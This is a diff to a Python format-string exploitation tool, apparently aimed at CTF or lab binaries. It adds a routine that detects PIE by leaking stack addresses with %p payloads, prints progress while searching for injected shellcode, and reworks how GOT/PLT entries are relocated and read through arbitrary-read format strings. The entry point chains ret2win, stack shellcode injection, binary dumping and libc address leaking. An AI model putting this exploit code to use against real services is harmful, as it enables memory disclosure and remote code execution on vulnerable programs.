@@ -55,6 +55,9 @@ class ffstr():
 		self.re_FlagPattern  	= b"[a-zA-Z0-9]+\{\S+\}"
 		self.re_ArgPattern	= b"%[0-9]+\$[a-zA-Z]{0,2}"
 		
+		# Checking if PIE
+		self.pie =  None
+		
 		# Dump binary
 		self.dump_name = None
 		
@@ -138,6 +141,10 @@ class ffstr():
 		# Write Calibration
 		if "CALIB" in args.keys():
 			self.calibration = int(args.CALIB)
+			
+		# Check PIE
+		if "PIE" in args.keys():
+			self.pie = int(args.PIE,16)
 			
 	def set_future_args(self,txt):
 		self.future_args.append(txt)
@@ -673,7 +680,10 @@ class ffstr():
 			# Write Instruction Pointer for returning to injected shellcode
 			pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")+shellcode
 			data = self.asyncExchange(pl)
-					
+			
+			# inform user
+			print("Searching shellcode at : "+str(k*4),end="\r")
+			
 			# Check shell
 			self.checkshell()
 
@@ -745,7 +755,35 @@ class ffstr():
 					self.close()
 			
 			
+	def PIE(self):
+	# Check if PIE is enabled
+	
+		# Lazy mode, don't redo things
+		if self.pie is not None:
+			return
+			
+		# Gathering information
+		info = []
+		for _ in range(2):
+					
+			# Get location
+			i , offset = self.start
+			
+			# Leak an hexadecimal value
+			leak = None
+			while leak is None:
+				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				regex = re.search(self.re_HexaPattern, data)
+				if regex:
+					leak = regex[0]
+					
+			# info gathering
+			info.append(leak)
 		
+		if info[0] == info[1]:
+			self.set_future_args("PIE="+info[0].decode())
+
+			
 	def dumpBinary(self):
 	
 		# Choice
@@ -900,6 +938,8 @@ class ffstr():
 			
 	def loadELF(self):
 		# leak libc adress
+		# ldd --version ldd 
+		# objdump --dynamic-reloc ffstrlab64 
 		
 		# if we have access to the elf
 		if "ELF" in args.keys():
@@ -915,13 +955,14 @@ class ffstr():
 		# Strings	
 		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
 			
-		# Got address
-		got = [ elt[2:-1][::-1].hex() for elt in re.findall(b"\xff\x25....\x68", data)]
+		# Got address 
+		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
 			
 		print(strings)
 		print(got)
+		
 		k=0
-		for elt in got:
+		for plt,rip in got:
 		
 			# Get location
 			i , offset = self.start
@@ -935,24 +976,24 @@ class ffstr():
 					leak = int(regex[0],16)
 				
 			# relocate 		
-			plt_got = int("0x"+elt,16)
+			plt_got = int(plt[2:-1][::-1].hex(),16)
 			if plt_got < leak-offset:
-				plt_got += 0x401040+k*16
-				k+=1
-				print(hex(plt_got))
+				plt_got += leak-offset+rip+6
+
 			
 			# Read anywhere format string
 			pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+
 			
 			# Get Data
 			data = b""
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 				data += self.asyncExchange(pl)
-			print(data)
+
 			left = data.find(self.delimiters[0])+len(self.delimiters[0])
 			right= data.find(self.delimiters[1])
 			dump =data[left:right]
-			print(dump[::-1].hex())
+			print(">> ",dump[::-1].hex())
 			
 
 
@@ -995,6 +1036,7 @@ if __name__ == "__main__":
 	exploit.ret2win()
 	exploit.stackshellcode()
 	exploit.locateBinary()
+	exploit.PIE()
 	exploit.dumpBinary()
 	exploit.showSymbols()
 	exploit.loadELF()
